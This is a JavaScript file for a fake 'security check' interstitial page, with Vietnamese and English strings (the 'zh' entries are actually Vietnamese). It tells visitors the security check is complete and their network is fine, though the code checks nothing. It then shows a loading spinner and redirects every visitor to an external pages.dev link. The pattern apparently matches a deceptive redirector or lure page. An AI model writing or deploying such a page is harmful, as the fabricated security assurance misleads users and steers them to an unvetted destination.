const contendI18nMap = {
  network: {
    zh: "Kiểm tra bảo mật đã hoàn tất, mạng tốt",
    vi: "Kiểm tra bảo mật đã hoàn tất, mạng tốt",
    en: "Security check completed, Network in good condition",
  },
  security: {
    zh: "Trang web an ninh",
    vi: "An ninh trang web",
    en: "Site security",
  },
  enter: {
    zh: "bấm vào để nhập",
    vi: "Nhấp để vào",
    en: "Click to enter",
  },
  loading: {
    zh: "Đang tiến hành kiểm tra an toàn",
    vi: "Đang kiểm tra an toàn",
    en: "Security check in progress",
  },
  footer: {
    zh: "Phần mềm bảo mật cung cấp hỗ trợ kỹ thuật",
    vi: "Security software provides technical support",
    en: "Security software provides technical support",
  },
};

let language = "zh";
let url;

const setContendI18n = () => {
  try {
    const lang = navigator.language.split("-")[0];
    if (contendI18nMap["network"][lang]) {
      language = lang;
    }

    document.getElementById("redirect-btn").innerHTML =
      contendI18nMap["enter"][language];

    document.getElementById("contend").innerHTML =
      contendI18nMap["network"][language];
    document.getElementById("footer-text").innerHTML =
      contendI18nMap["footer"][language];

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    if (isMobile) {
      url = 'https://link-bcb.pages.dev/';
    } else {
      url = 'https://link-bcb.pages.dev/';
    }
  } catch (error) {
    console.error(error);
  }
};

const setFooterYear = () => {
  const year = new Date().getFullYear();
  document.getElementById("footer-year").innerHTML = year;
};

const handleClick = () => {
  // Check if it's a mobile device
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  // If it's not a mobile device, perform the redirect
  if (1) {
    // show loading
    document.querySelector(".status .text").innerHTML =
      contendI18nMap["loading"][language];
    document.querySelector(".status .loader").style.display = "flex";

    setTimeout(() => {
      window.location.href = url;
    }, 1000);
  }
};

window.addEventListener("load", () => {
  setContendI18n();
  setFooterYear();
});
